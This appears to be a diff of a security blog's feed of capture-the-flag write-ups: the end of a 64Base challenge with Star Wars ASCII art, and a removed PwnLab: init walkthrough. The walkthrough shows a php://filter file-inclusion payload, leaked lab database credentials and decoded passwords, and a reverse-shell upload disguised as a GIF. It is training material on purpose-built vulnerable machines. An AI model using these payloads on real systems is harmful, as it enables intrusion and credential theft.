+   _<em> \  1  |&mdash;&mdash;  9  &mdash;&mdash;|~&ndash;.</em> / __/         (levels 4-5)</p>
+
+<pre><code>  \ \    |====    B====|    Y /      3 ...... Base Security (levels 1-5)
+   \ \   |----     ----|   / /       4 ......... Turbolifts (levels 1-6)
+   / /   |__A_     _ __| 8 \ \       5 .... Detention Block (levels 1-5)
+   \ \      | |   | |      / /       6 ... Technical and Service Person-
+    \ \_____| |   | |_____/ /              nel Barracks (levels 1-5)
+     \_____ `o|   |o' _____/         7 ... Technical Shops (levels 1-2),
+           `--'   `--'                     Medical   Bay    (level   3),
+                                           Science Labs (levels 4-5)
+            8 ... Storage Gallery (levels 1-2), Droid Shops (levels 3-5)
+            9 ...................... Surface Vehicle  Bay  (levels 1-5):
+            A .................................. AT-ST Scout Walker Bays
+            B ........................................ AT-AT Walker Bays
+            C ...................... Vehicle Maintenance and Repair Deck
+            D ........................................ Speeder Bike Deck
+            10 ........................... Miscellaneous Vehicle Parking
+</code></pre>
+
+<hr />
+
+<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>
+
+<pre><code>                                       I n t e r i o r ,   L e v e l   6
+                                       ---------------------------------
+     ____           ____
+    / __ \_________/ __ \        Base command personnel,  control rooms,
+   / /  \___________/  \ \       rooms,  trade  mission,  and diplomatic
+   \ \ o     oo      o / /       offices are located on this level.
+   / /       oo----.   \ \
+  / /   8  __oo     `.1 \ \      1 ....... Sensor Monitors, Tractor Beam
+</code></pre>
+
+<p>   <strong>/ /\    .~  ||   2   \  \ __                       and Shield Controls
+  / </strong>/  \ .&lsquo; 9.&ndash;&rsquo;<code>-.      | /\__ \  2 ....................... Computer Room
+ / /   o  \|__:   o  :_____|/ o  \ \ 3 ....................... Meeting Rooms
+ \ \__  7 .---: 10   :------.3 __/ / 4 ...... Officers' and Pilots' Quarters
+  \__ \  /    </code>&ndash;..&ndash;&lsquo;        \/ __/  5 &hellip; Trade Mission, Diplomatic Offices</p>
+
+<pre><code> \ \/\   5   ||          / /     6 ........... Base Commander's Quarters
+  \ \ `.     ||    4    / /                                  and offices
+   \ \ o~`---||      o / /       7 ............ Officer Recreation Rooms
+   / /6  ____||_____   \ \       8 ............................. Offices
+   \ \__/ _________ \__/ /       9 ................... Base Control Room
+    \____/         \____/        10 ..................... Reception Area
+</code></pre>
+
+<hr />
+
+<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>
+
+<pre><code>                                       I n t e r i o r ,   L e v e l   7
+                                       ---------------------------------
+    __             __
+   /_]\           /[_\        The TIE Fighter  Hanger  Deck  houses  the
+   \ \,===========./ /        garrison's TIE fighters in standard-design
+   //:o-----------o:\\        ceiling racks.  Bases are usually equipped
+  /// X  X X X X  X \\\       with  30 TIE fighters and five TIE bombers
+ /// X X  X_X_X  X X \\\      (a single  bomber  takes  up the same rack
+</code></pre>
+
+<p>  <strong>/// X X   [</strong><em>]   X X \_</em>   space as two fighters).  Five  to 15 ships
+ /_/o X X  1 &amp;/3&amp;    X X o_/\  are on constant  patrol,  depending on the
+ ]<em>\ X X   &lt;\</em>//>       //_[/  base&rsquo;s readiness level.</p>
+
+<pre><code>\\\ X X   \&gt;&amp;&lt;/2  X []///
+ \\\ X X   []    X []///      1 .............. TIE Fighter Ceiling Racks
+  \\\ X   [] []     ///                           (holds up to 40 craft)
+   \\:o-----------o://        2 ............. Lift Platforms, to Level 8
+   /_/`==========='\_\        3 .................. Flight Control Center
+   \_]/           \[_/        X ............................ TIE Fighter
+                              [] ............................ TIE Bomber
+</code></pre>
+
+<hr />
+
+<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>
+
+<pre><code>                                       I n t e r i o r ,   L e v e l   8
+                                       ---------------------------------
+                                                  (not shown)
+</code></pre>
+
+<p>  The Flight Deck contains the  tractor beam  generators which catapult out-
+  going craft into the open sky and reel in landing ships. Pilots relinquish
+  control of  their ships during take off and landing because of the limited
+  maneuvering area within the chutes.</p>
+
+<hr />
+
+<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>
+
+<pre><code>                           S u b - L e v e l   I n s t a l l a t i o n s
+                           ---------------------------------------------
+                                            (not shown)
+</code></pre>
+
+<p>  A large underground section of the base  houses the main power and back-up
+  generators, the tractor beam and deflector shield generators, the environ-
+  ment  control  station,  and  the  waste  disposal and refuse units.  Some
+  storage facilities are also located here.</p>
+
+<hr />
+
+<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ Version 1.9 (released 941211).
+ Pictures by Lennert Stock  (LS),  Rowan Crawford (-Row),  Ray Brunner,  Bob
+ VanderClay and Joe Rumsey.  The pictures work best when shown on a white on
+ black screen  (except for some faces)  with a not too fancy font. Contribu-
+ tions welcome, email to the adress below. Sources LS: The Star Wars Source-
+ book,  Star Wars Imperial Sourcebook,  The Star Wars Rebel Alliance Source-
+ book, Star Wars: The Roleplaying Game (2nd Ed) all by West End Games, Inc.</p>
+
+<hr />
+
+<hr />
+
+<p> |<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||______|</p>
+
+<hr />
+
+<p> | \ | | / <strong> \ \        / / \ \   / // </strong> \ | |  | |( )|  <strong> \ |  </strong><strong>|
+ |  \| || |  | |\ \  /\  / /   \ _/ /| |  | || |  | ||/ | |</strong>) || |<strong>  <br/>
+ | . ` || |  | | \ \/  \/ /     \   / | |  | || |  | |   |  _  / |  </strong>| <br/>
+ | |\  || |<strong>| |  \  /\  /       | |  | |</strong>| || |<strong>| |   | | \ \ | |</strong><strong><br/>
+ |<em>| _| _</em></strong>/    \/  \/        |<em>|   _</em><strong>/  _</strong><em>/    |</em>|  _\|______|</p>
+
+<pre><code>                            _  ______  _____  _____  _                
+         /\                | ||  ____||  __ \|_   _|| |               
+        /  \               | || |__   | |  | | | |  | |               
+       / /\ \          _   | ||  __|  | |  | | | |  | |               
+      / ____ \        | |__| || |____ | |__| |_| |_ |_|               
+     /_/    \_\        \____/ |______||_____/|_____|(_)               
+</code></pre>
+
+<hr />
+
+<p> |<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||<strong><strong><strong>||</strong></strong></strong>||______|</p>
+
+<pre><code>                I hope you enjoyed this challenge
+                Please leave comments &amp; feedback
+                @ https://www.vulnhub.com/?q=64base
+                -----------------------------------
+                64Base Challenge by 3mrgnc3
+                https://3mrgnc3.ninja/challenges   
+                -----------------------------------
+</code></pre>
+
+<p>```</p>
+
+<p>```
+/ Peace is a lie, there is only passion.  \
+| Through passion, I gain strength.       |
+| Through strength, I gain power. Through |
+| power, I gain victory. Through victory, |
+| my chains are broken. The Force shall   |
+\ free me.                                /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[SkyDog Con CTF 2016 - Catch Me If You Can]]></title>
@@ -72,7 +747,7 @@ nmap -T4 -sC -sV -p- 192.168.145.136</p>
 <p>I already ran Nmap and saw that SSH is listening on port 22222. Trying to SSH as frank gives the next flag:</p>
 
 <p>```
-ssh <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#102;&#114;&#x61;&#110;&#x6b;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#52;&#x35;&#46;&#49;&#51;&#54;">&#x66;&#114;&#x61;&#110;&#107;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#x31;&#52;&#53;&#x2e;&#49;&#51;&#54;</a> -p 22222
+ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#102;&#114;&#97;&#x6e;&#107;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x31;&#x34;&#53;&#46;&#x31;&#x33;&#54;">&#102;&#114;&#97;&#x6e;&#x6b;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#52;&#53;&#x2e;&#49;&#51;&#54;</a> -p 22222
 The authenticity of host &lsquo;[192.168.145.136]:22222 ([192.168.145.136]:22222)&rsquo; can&rsquo;t be established.
 ECDSA key fingerprint is SHA256:DeCMZ74o5wesBHFLyaVY7UTCA7mW+bx6WroHm6AgMqU.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -92,7 +767,7 @@ Warning: Permanently added &lsquo;[192.168.145.136]:22222&rsquo; (ECDSA) to the 
 
 <h6>#</h6>
 
-<p><a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#x66;&#114;&#97;&#x6e;&#107;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#x31;&#52;&#x35;&#46;&#49;&#51;&#x36;">&#102;&#114;&#97;&#x6e;&#x6b;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#49;&#x34;&#53;&#46;&#49;&#51;&#x36;</a>&rsquo;s password:
+<p><a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x66;&#114;&#97;&#x6e;&#107;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#x31;&#x34;&#x35;&#x2e;&#x31;&#51;&#54;">&#102;&#114;&#97;&#110;&#107;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#46;&#49;&#52;&#x35;&#46;&#x31;&#x33;&#x36;</a>&rsquo;s password:
 ```</p>
 
 <p>The decoded hint is <code>encrypt</code></p>
@@ -194,7 +869,7 @@ scp -P 22222 barryallen@192.168.145.136:security-system.data .</p>
 
 <h6>#</h6>
 
-<p><a href="&#x6d;&#97;&#105;&#108;&#116;&#x6f;&#58;&#98;&#x61;&#x72;&#114;&#x79;&#x61;&#x6c;&#x6c;&#101;&#x6e;&#64;&#49;&#57;&#50;&#46;&#49;&#54;&#56;&#x2e;&#49;&#52;&#x35;&#x2e;&#x31;&#51;&#x36;">&#x62;&#97;&#x72;&#x72;&#121;&#x61;&#108;&#x6c;&#x65;&#110;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x31;&#52;&#x35;&#x2e;&#x31;&#51;&#x36;</a>&rsquo;s password:
+<p><a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#98;&#97;&#x72;&#114;&#121;&#97;&#x6c;&#108;&#x65;&#x6e;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#x31;&#52;&#53;&#46;&#x31;&#x33;&#x36;">&#98;&#x61;&#114;&#114;&#x79;&#x61;&#108;&#108;&#x65;&#110;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#49;&#x34;&#x35;&#46;&#49;&#51;&#54;</a>&rsquo;s password:
 security-system.data                          100%   71MB   6.6MB/s   00:10  <br/>
 ```</p>
 
@@ -1134,9 +1809,9 @@ PORT   STATE SERVICE VERSION
 <p>The contact page gives us some names and mail addresses:</p>
 
 <ul>
-<li>Roger S. Michaels &ndash; <a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#x72;&#x6d;&#105;&#99;&#104;&#x61;&#x65;&#108;&#115;&#x40;&#x69;&#x6d;&#x66;&#46;&#108;&#x6f;&#x63;&#x61;&#x6c;">&#x72;&#109;&#105;&#x63;&#104;&#97;&#101;&#x6c;&#115;&#64;&#x69;&#109;&#x66;&#x2e;&#108;&#x6f;&#x63;&#x61;&#108;</a></li>
-<li>Alexander B. Keith &ndash; <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#58;&#97;&#x6b;&#x65;&#x69;&#116;&#104;&#64;&#105;&#x6d;&#102;&#46;&#x6c;&#x6f;&#99;&#x61;&#108;">&#97;&#107;&#x65;&#105;&#x74;&#104;&#64;&#x69;&#x6d;&#102;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#x6c;</a></li>
-<li>Elizabeth R. Stone &ndash; <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x65;&#x73;&#116;&#111;&#110;&#x65;&#64;&#105;&#x6d;&#102;&#46;&#108;&#111;&#99;&#97;&#x6c;">&#101;&#115;&#116;&#x6f;&#x6e;&#101;&#x40;&#x69;&#x6d;&#102;&#46;&#108;&#x6f;&#x63;&#97;&#108;</a></li>
+<li>Roger S. Michaels &ndash; <a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#114;&#x6d;&#105;&#x63;&#x68;&#97;&#x65;&#x6c;&#x73;&#x40;&#x69;&#109;&#x66;&#x2e;&#108;&#x6f;&#99;&#97;&#x6c;">&#114;&#109;&#x69;&#99;&#104;&#97;&#x65;&#108;&#x73;&#x40;&#x69;&#109;&#x66;&#x2e;&#108;&#x6f;&#99;&#x61;&#108;</a></li>
+<li>Alexander B. Keith &ndash; <a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#x61;&#107;&#x65;&#x69;&#x74;&#x68;&#64;&#105;&#x6d;&#102;&#46;&#108;&#111;&#99;&#x61;&#108;">&#97;&#x6b;&#x65;&#x69;&#116;&#x68;&#64;&#105;&#x6d;&#102;&#x2e;&#x6c;&#111;&#99;&#x61;&#x6c;</a></li>
+<li>Elizabeth R. Stone &ndash; <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x65;&#x73;&#116;&#x6f;&#110;&#101;&#x40;&#105;&#109;&#102;&#x2e;&#x6c;&#111;&#99;&#x61;&#108;">&#101;&#x73;&#x74;&#x6f;&#110;&#x65;&#64;&#x69;&#x6d;&#x66;&#46;&#108;&#111;&#x63;&#97;&#x6c;</a></li>
 </ul>
 
 
@@ -1902,7 +2577,7 @@ Thank you for trying this challenge and please send any feedback.</p>
 
 <p>Geckom
 Twitter: @g3ck0ma
-Email: <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#x67;&#x65;&#99;&#x6b;&#x6f;&#x6d;&#x40;&#x72;&#x65;&#x64;&#x74;&#101;&#x61;&#x6d;&#x72;&#46;&#99;&#x6f;&#109;">&#x67;&#x65;&#x63;&#x6b;&#x6f;&#x6d;&#64;&#114;&#x65;&#100;&#x74;&#x65;&#97;&#x6d;&#114;&#x2e;&#99;&#x6f;&#x6d;</a>
+Email: <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#103;&#101;&#99;&#107;&#111;&#109;&#x40;&#114;&#101;&#x64;&#x74;&#x65;&#x61;&#x6d;&#114;&#46;&#99;&#x6f;&#x6d;">&#x67;&#x65;&#99;&#x6b;&#x6f;&#x6d;&#x40;&#114;&#101;&#x64;&#116;&#x65;&#x61;&#109;&#x72;&#x2e;&#99;&#111;&#x6d;</a>
 Web: <a href="http://redteamr.com">http://redteamr.com</a></p>
 
 <p>Special Thanks
@@ -2123,476 +2798,6 @@ root@Quaoar:~# cat /root/flag.txt
 <p>/ Be cheerful while you are alive. \
 |                                  |
 \ &mdash; Phathotep, 24th Century B.C.  /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pwnlab: init]]></title>
-    <link href="http://chousensha.github.io/blog/2018/08/25/pwnlab-init/"/>
-    <updated>2018-08-25T17:01:13-04:00</updated>
-    <id>http://chousensha.github.io/blog/2018/08/25/pwnlab-init</id>
-    <content type="html"><![CDATA[<p>Today&rsquo;s boot2root is called PwnLab: init and the goal is to read the flag in /root/flag.txt</p>
-
-<!-- more -->
-
-
-<p><code>
-Nmap scan report for 192.168.164.129
-Host is up (0.00099s latency).
-Not shown: 65531 closed ports
-PORT      STATE SERVICE VERSION
-80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
-|_http-server-header: Apache/2.4.10 (Debian)
-|_http-title: PwnLab Intranet Image Hosting
-111/tcp   open  rpcbind 2-4 (RPC #100000)
-| rpcinfo:
-|   program version   port/proto  service
-|   100000  2,3,4        111/tcp  rpcbind
-|   100000  2,3,4        111/udp  rpcbind
-|   100024  1          37397/udp  status
-|_  100024  1          58026/tcp  status
-3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
-| mysql-info:
-|   Protocol: 10
-|   Version: 5.5.47-0+deb8u1
-|   Thread ID: 38
-|   Capabilities flags: 63487
-|   Some Capabilities: InteractiveClient, LongColumnFlag, FoundRows, SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsTransactions, LongPassword, Support41Auth, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, ODBCClient, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
-|   Status: Autocommit
-|   Salt: pKc2lJniDVf|]&lt;Rg2bwQ
-|_  Auth Plugin Name: 88
-58026/tcp open  status  1 (RPC #100024)
-</code></p>
-
-<p>The website is an intranet portal for uploading images, but we have to login first.</p>
-
-<p><img class="center" src="/images/pentest/pwnlab_init/web.jpg" title="&lsquo;web server&rsquo; &lsquo;intranet portal&rsquo;" ></p>
-
-<p>I ran Nikto on it but there were no interesting finds, except for the following line:</p>
-
-<p><code>
-+ /config.php: PHP Config file may contain database IDs and passwords.
-</code></p>
-
-<p>However, when I tried to read that file, all I got was a blank page. I&rsquo;ve noticed that the URLs for the pages look like this: <a href="http://192.168.164.129/?page=login">http://192.168.164.129/?page=login</a> for the login page and <a href="http://192.168.164.129/?page=upload">http://192.168.164.129/?page=upload</a> for the upload page. I tried some directory traversal and file inclusion techniques, thinking that this might be the way of reading the config.php file, but had no luck. However, as I was searching for a way on the internet, I came across this article on a <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/">LFI method that uses PHP filters</a>. The below command allows reading the source of PHP files by using the filter functionality to base64 encode the contents of the file before reading it:</p>
-
-<p><code>url?page=php://filter/convert.base64-encode/resource=config</code></p>
-
-<p>This returned a base64 string that when decoded, gave me the MySQL credentials:</p>
-
-<p><code>
-&lt;?php
-$server   = "localhost";
-$username = "root";
-$password = "H4u%QJ_H99";
-$database = "Users";
-?&gt;
-</code></p>
-
-<p>Now we can connect to that database:</p>
-
-<p>```
-mysql -u root -h 192.168.217.143
-ERROR 1045 (28000): Access denied for user &lsquo;root&rsquo;@&lsquo;192.168.217.132&rsquo; (using password: NO)
-root@kali:~# mysql -u root -p -h 192.168.217.143
-Enter password:
-Welcome to the MariaDB monitor.  Commands end with ; or \g.
-Your MySQL connection id is 41
-Server version: 5.5.47-0+deb8u1 (Debian)</p>
-
-<p>Copyright &copy; 2000, 2017, Oracle, MariaDB Corporation Ab and others.</p>
-
-<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.</p>
-
-<p>MySQL [(none)]> use Users
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A</p>
-
-<p>Database changed
-MySQL [Users]><br/>
-```</p>
-
-<p>Let&rsquo;s see what we have here:</p>
-
-<p><code>
-MySQL [Users]&gt; show tables;
-+-----------------+
-| Tables_in_Users |
-+-----------------+
-| users           |
-+-----------------+
-1 row in set (0.00 sec)
-MySQL [Users]&gt; select * from users;
-+------+------------------+
-| user | pass             |
-+------+------------------+
-| kent | Sld6WHVCSkpOeQ== |
-| mike | U0lmZHNURW42SQ== |
-| kane | aVN2NVltMkdSbw== |
-+------+------------------+
-3 rows in set (0.05 sec)
-</code></p>
-
-<p>3 users with base64 encoded passwords!</p>
-
-<p><code>
-kent / JWzXuBJJNy
-mike / SIfdsTEn6I
-kane / iSv5Ym2GRo
-</code></p>
-
-<p>I logged in as kent and tried uploading a PHP reverse shell, but got an error stating that the file type is not allowed. Using the previous LFI method, let&rsquo;s take a look at the source code of the upload page:</p>
-
-<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
-</span><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
-</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">user</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">You</span> <span class="nx">must</span> <span class="nx">be</span> <span class="nx">log</span> <span class="nx">in</span><span class="o">.&amp;</span><span class="nx">rsquo</span><span class="p">;);</span> <span class="p">}</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">&lt;html&gt;&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="x">&lt;pre&gt;&lt;code&gt;&amp;lt;body&amp;gt;</span>
-</span><span class='line'><span class="x">    &amp;lt;form action=&#39;&#39; method=&#39;post&#39; enctype=&#39;multipart/form-data&#39;&amp;gt;</span>
-</span><span class='line'><span class="x">        &amp;lt;input type=&#39;file&#39; name=&#39;file&#39; id=&#39;file&#39; /&amp;gt;</span>
-</span><span class='line'><span class="x">        &amp;lt;input type=&#39;submit&#39; name=&#39;submit&#39; value=&#39;Upload&#39;/&amp;gt;</span>
-</span><span class='line'><span class="x">    &amp;lt;/form&amp;gt;</span>
-</span><span class='line'><span class="x">&amp;lt;/body&amp;gt;</span>
-</span><span class='line'><span class="x">&lt;/code&gt;&lt;/pre&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="x">&lt;p&gt;&lt;/html&gt;</span>
-</span><span class='line'><span class="x">&amp;lt;?php</span>
-</span><span class='line'><span class="x">if(isset($_POST[&amp;lsquo;submit&amp;rsquo;])) {&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="x">&lt;pre&gt;&lt;code&gt;if ($_FILES[&#39;file&#39;][&#39;error&#39;] &amp;lt;= 0) {</span>
-</span><span class='line'><span class="x">    $filename  = $_FILES[&#39;file&#39;][&#39;name&#39;];</span>
-</span><span class='line'><span class="x">    $filetype  = $_FILES[&#39;file&#39;][&#39;type&#39;];</span>
-</span><span class='line'><span class="x">    $uploaddir = &#39;upload/&#39;;</span>
-</span><span class='line'><span class="x">    $file_ext  = strrchr($filename, &#39;.&#39;);</span>
-</span><span class='line'><span class="x">    $imageinfo = getimagesize($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);</span>
-</span><span class='line'><span class="x">    $whitelist = array(&quot;.jpg&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.png&quot;); </span>
-</span><span class='line'>
-</span><span class='line'><span class="x">    if (!(in_array($file_ext, $whitelist))) {</span>
-</span><span class='line'><span class="x">        die(&#39;Not allowed extension, please upload images only.&#39;);</span>
-</span><span class='line'><span class="x">    }</span>
-</span><span class='line'>
-</span><span class='line'><span class="x">    if(strpos($filetype,&#39;image&#39;) === false) {</span>
-</span><span class='line'><span class="x">        die(&#39;Error 001&#39;);</span>
-</span><span class='line'><span class="x">    }</span>
-</span><span class='line'>
-</span><span class='line'><span class="x">    if($imageinfo[&#39;mime&#39;] != &#39;image/gif&#39; &amp;amp;&amp;amp; $imageinfo[&#39;mime&#39;] != &#39;image/jpeg&#39; &amp;amp;&amp;amp; $imageinfo[&#39;mime&#39;] != &#39;image/jpg&#39;&amp;amp;&amp;amp; $imageinfo[&#39;mime&#39;] != &#39;image/png&#39;) {</span>
-</span><span class='line'><span class="x">        die(&#39;Error 002&#39;);</span>
-</span><span class='line'><span class="x">    }</span>
-</span><span class='line'>
-</span><span class='line'><span class="x">    if(substr_count($filetype, &#39;/&#39;)&amp;gt;1){</span>
-</span><span class='line'><span class="x">        die(&#39;Error 003&#39;);</span>
-</span><span class='line'><span class="x">    }</span>
-</span><span class='line'>
-</span><span class='line'><span class="x">    $uploadfile = $uploaddir . md5(basename($_FILES[&#39;file&#39;][&#39;name&#39;])).$file_ext;</span>
-</span><span class='line'>
-</span><span class='line'><span class="x">    if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadfile)) {</span>
-</span><span class='line'><span class="x">        echo &quot;&amp;lt;img src=\&quot;&quot;.$uploadfile.&quot;\&quot;&amp;gt;&amp;lt;br /&amp;gt;&quot;;</span>
-</span><span class='line'><span class="x">    } else {</span>
-</span><span class='line'><span class="x">        die(&#39;Error 4&#39;);</span>
-</span><span class='line'><span class="x">    }</span>
-</span><span class='line'><span class="x">}</span>
-</span><span class='line'><span class="x">&lt;/code&gt;&lt;/pre&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="x">&lt;p&gt;}&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="x">&lt;p&gt;?&gt;</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div></p>
-
-<p>We can see that the file will get uploaded to the /upload folder with an MD5 name and that it has to be an image file of the 4 allowed types, complete with a matching MIME type. To test it, I changed pentestmonkey&rsquo;s reverse shell extension to .gif and added the magic string at the beginning of the file (GIF98). Then I pushed the upload button and bingo! The shell has been successfully deployed at <code>upload/ff280c52a4fbcbea847ca4a2d69ce6c0.gif</code></p>
-
-<p>My listener is prepared and all, but there is still the matter of how to execute the shell. For any possible hint, I&rsquo;ve looked t the source code of the index page:</p>
-
-<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
